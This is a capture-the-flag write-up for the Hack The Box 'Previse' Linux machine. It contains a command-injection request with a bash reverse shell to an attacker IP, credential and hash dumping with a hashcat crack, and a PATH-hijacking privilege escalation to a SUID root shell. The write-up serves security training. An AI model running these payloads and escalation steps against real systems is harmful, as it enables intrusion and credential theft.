# Previse
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | N/A | Nmap, Gobuster, Execute After Read (EAR) | Performed an Nmap scan to identify open ports, finding SSH (22) and HTTP (80). Directory enumeration with `gobuster` revealed several PHP files, and analysis of the responses in Burp Suite uncovered an "Execute After Read" (EAR) vulnerability, where the server would return the full PHP source code before redirecting. |
| 2 | www-data | Web Code Analysis, Command Injection | Exploited the EAR vulnerability to view the source code of `logs.php`. The script was found to be vulnerable to command injection via the `delim` POST parameter. A reverse shell payload was crafted and injected into the parameter, resulting in a shell as the `www-data` user. |
| 3 | m4lwhere | Database Credentials, Hash Cracking | The web application's configuration file (`config.php`) was found to contain MySQL root credentials (`root:mySQL_p@ssw0rd!:)`). Logged into the database using these credentials and dumped the `accounts` table. This revealed an MD5 hash for the user `m4lwhere`, which was cracked using a wordlist attack with `hashcat`, yielding the password `ilovecody112235!`. Used these credentials to log in via SSH as `m4lwhere`. |
| 4 | root | `sudo` Path Manipulation, Shell | Performed local enumeration as `m4lwhere` and discovered that the user could run the `/opt/scripts/access_backup.sh` script as `root` without a password. The script used the `gzip` command without a full path and did not specify a `secure_path` in the `sudo` configuration. Created a malicious executable named `gzip` in the `/home/m4lwhere` directory, which, when executed, would give the user a `bash` shell with SUID privileges. This allowed the user to execute `/bin/bash -p` to get a root shell. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
Nmap scan report for 10.10.11.104
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
```
As we can see we have only two ports open: 22 and 80, so withouth further doing let's start enumerate port 80.  
As we open the web page, we can notice an authentication prompt, if we try common default credentials we have no luck.  
If we use `gobuster` and start directory enumeration, we can notice that the sizes of 302 responses are a bit strange:  
```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2022/07/07 16:31:06 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 2224]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/index.php            (Status: 302) [Size: 2801] [--> login.php]             
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/download.php         (Status: 302) [Size: 0] [--> login.php]                 
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/files.php            (Status: 302) [Size: 4914] [--> login.php]              
/logs.php             (Status: 302) [Size: 0] [--> login.php]                 
/config.php           (Status: 200) [Size: 0]                                 
/header.php           (Status: 200) [Size: 980]                               
/footer.php           (Status: 200) [Size: 217]                               
/.                    (Status: 302) [Size: 2801] [--> login.php]              
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/nav.php              (Status: 200) [Size: 1248]                              
/status.php           (Status: 302) [Size: 2966] [--> login.php]              
Progress: 213832 / 478404 (44.70%)                        
```
if we take one of this requests and send it to burp, we can see that in the 302 response body the site is disclosing the code page before redirecting us.  
This type of vulnerability is called Execute After Read (EAR), the same has been discovered in a previous assessment in [Bank](Bank.md).  
Now we can set up a 'Match and Replace' rule in burpsuite to match `302 Found` and replace it with `200 Ok`  in the response header. 
Once we setup this rule we will be able to open restricted pages and create an administrator account that we can use to access the platform as a regular user.
Once we are logged in we can notice a 'download siteBackup' button.  
If we click on this button, we will be able to download the site code and see the following in `logs.php`
```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```
Now we can try to exploit this part of code and get a reverse shell.

## Foothold
We can try to obtain a blind command ececution by adding a `; sleep 2` before the delim parameter and exploit the code snippet above.  
As we can observe we will see the response time increase after we add a sleep command:  
![](AttachmentS/Pasted%20image%2020220708160454.png)
Once we can see that we can inject code, we can add our reverse bash payload to gain a shell on this box:  
```
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=0nqfeq1ri9psi0kuig6ku8q939
Upgrade-Insecure-Requests: 1

delim=comma%3b+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.9/9001+0>%261'
```
as we execute this request we get a shell as `www-data`:
```bash
root@kali:~/Documents/HTB/Boxes/Previse/site# nc -lvnp 9001
listening on [any] 9001 ...
        connect to [10.10.14.9] from (UNKNOWN) [10.10.11.104] 39672
bash: cannot set terminal process group (1298): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ 
```

## User
Coming back to the code, we can see that MySQL credentials are disclosed within the code.  
```php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
Once we have shell access to this box, we can try to login to mysql using the above credentials.  
```shell
www-data@previse:/var/www/html$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>    
```
Once we are logged into the database we can poke around for hashes:  
```shell
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> describe accounts;
+------------+--------------+------+-----+-------------------+----------------+
| Field      | Type         | Null | Key | Default           | Extra          |
+------------+--------------+------+-----+-------------------+----------------+
| id         | int(11)      | NO   | PRI | NULL              | auto_increment |
| username   | varchar(50)  | NO   | UNI | NULL              |                |
| password   | varchar(255) | NO   |     | NULL              |                |
| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP |                |
+------------+--------------+------+-----+-------------------+----------------+
4 rows in set (0.00 sec)

mysql> select username,password from accounts;      
+----------+------------------------------------+
| username | password                           |
+----------+------------------------------------+
| m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. |
| b0ddd    | $1$🧂llol$04L/OghOADV.ufho3gKfY. |
+----------+------------------------------------+
2 rows in set (0.00 sec)

mysql> 
```
we know the password for our account, let's try now to crack the `m55crypt` hash for the user `m4lwhere`.  
```shell
[root@kali Previse ]$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz, 2182/4428 MB (1024 MB allocatable), 2MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

INFO: All hashes found in potfile! Use --show to display them.

Started: Thu Jul  7 20:13:55 2022
Stopped: Thu Jul  7 20:13:58 2022
[root@kali Previse ]$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt  --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```
As we can see we cracked the hash and obtained a password.  
Once we have the password we can try to login via ssh:  
```shell
[root@kali Previse ]$ ssh -l m4lwhere $TARGET 
m4lwhere@10.10.11.104's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jul  7 19:58:19 UTC 2022

  System load:  0.08              Processes:           179
  Usage of /:   50.6% of 4.85GB   Users logged in:     0
  Memory usage: 28%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
```
## Root
Once we log in, we can check sudo capabilities for user `m4lwhere`, when sudo prompts the password we are able to provide a valid passphrase since we have the user's password.  
```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
If we inspect the script, we can notice that the script is using relative paths and that sudo is noth defining any secure_path directive:  
```bash
m4lwhere@previse:/opt/scripts$ cat access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
Now we can create a `gzip` file containing `chmod 4755 /bin/bash` and export `$PATH` with this new value:  
```bash
m4lwhere@previse:~$ vi gzip
m4lwhere@previse:~$ chmod +x gzip 
m4lwhere@previse:~$ ls
gzip  user.txt
m4lwhere@previse:~$ export PATH=$(pwd):$PATH
m4lwhere@previse:~$ echo $PATH
/home/m4lwhere:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh                                                                                                                                                                                     
m4lwhere@previse:~$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
m4lwhere@previse:~$ bash -p
bash-4.4# id
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) groups=1000(m4lwhere)
```
and we have a root shell
